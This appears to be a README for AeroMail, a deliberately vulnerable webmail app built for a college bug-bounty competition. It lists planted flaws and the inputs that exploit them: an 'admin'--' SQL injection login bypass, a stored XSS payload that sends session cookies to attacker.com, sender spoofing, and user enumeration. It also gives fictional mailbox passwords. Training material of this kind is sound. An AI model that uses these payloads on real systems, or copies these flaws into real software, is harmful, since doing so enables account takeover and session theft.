# AeroMail — 911 Airliner Corporate Webmail (`mail.etherence.com`)
### Built with Next.js 16 (App Router) for College Symposium Bug Bounty Competition

This is the official Next.js implementation of the **AeroMail** webmail service for the **SKYBREACH** Bug Bounty challenge. It faithfully replicates the Roundcube 1.6 dark aesthetic and contains all the challenge storyline emails and simulated vulnerability surfaces.

---

## 🎯 Target Vulnerabilities Configured

| ID | Title | OWASP | Severity | Testing / Exploitation Vector |
|---|---|---|---|---|
| **V28** | SQLi Login Bypass on Webmail | A03 Injection | P2 (High) | Enter `admin'--` in the username field (with any password) or `POST /api/auth/login` with SQL injection payloads to bypass authentication and gain full administrator access to all employee inboxes. |
| **V29** | Stored XSS in Email Body | A03 Injection | P2 (High) | Compose / deliver an email containing `<script>document.location='http://attacker.com/?c='+document.cookie</script>` or `<img src=x onerror=alert(document.cookie)>`. When opened, unescaped HTML & scripts execute, exposing the `aeromail_session` cookie. |
| **V30** | SMTP Open Relay / Spoof Any Sender | A05 Misconfiguration | P2 (High) | Use the Compose window's editable `From:` field or `POST /api/mail` to spoof emails from anyone (e.g. `b.kumaran@911-airliner.com`) to any employee without sender verification. |
| **V31** | SMTP VRFY User Enumeration | A09 Logging & Monitoring | P4 (Low) | Send requests to `GET /api/mail/vrfy?email={user}`. Valid employees return `250 2.1.5 User exists`, non-existent users return `550 5.1.1 User unknown`. |
| **V_HEADERS** | Missing Security Headers | A05 Misconfiguration | P5 (Info) | Missing CSP, HSTS, and X-Frame-Options headers. |
| **V_VERSION** | Server Version Disclosure | A05 Misconfiguration | P5 (Info) | Responses disclose `Server: Apache/2.4.52 (Ubuntu) mod_wsgi/4.9.0 Python/3.10` and `X-Powered-By: Roundcube Webmail/1.6.0`. |

---

## 🚀 Running the Application

### 1. Install Dependencies
```bash
cd aeromail
npm install
```

### 2. Development Mode
```bash
npm run dev
```
Open [http://localhost:3000](http://localhost:3000) in your browser.

### 3. Production Build
```bash
npm run build
npm run start
```

---

## 👥 Pre-Configured Employee Mailboxes

- **Krishnamurthy Pilo** (`k.pilo@911-airliner.com` / `pilo2002`) — Airline founder; contains threat letters, DroNet security escalations, and unsent drafts.
- **Survesh VP** (`s.vp@911-airliner.com` / `survesh123`) — Vice President; rushed DroNet deployment, sent chaotic 2 AM push orders.
- **Raghav Mighty** (`r.mighty@911-airliner.com` / `ciso_raghav!`) — CISO; detailed Q3 Security Reports identifying critical vulnerabilities.
- **Vinot Intern** (`v.intern@911-airliner.com` / `intern2024`) — Junior Engineer; contains Guru's deployment notes and public repository configs.
- **Sayana HR** (`s.hr@911-airliner.com` / `sayana_hr`) — HR Director; concerned correspondence regarding security warnings.

*(Alternatively, sign in using SQL injection: `admin'--`)*

---

## 🧪 Verification Script
Run the built-in automated test suite:
```bash
node test_api.js
```
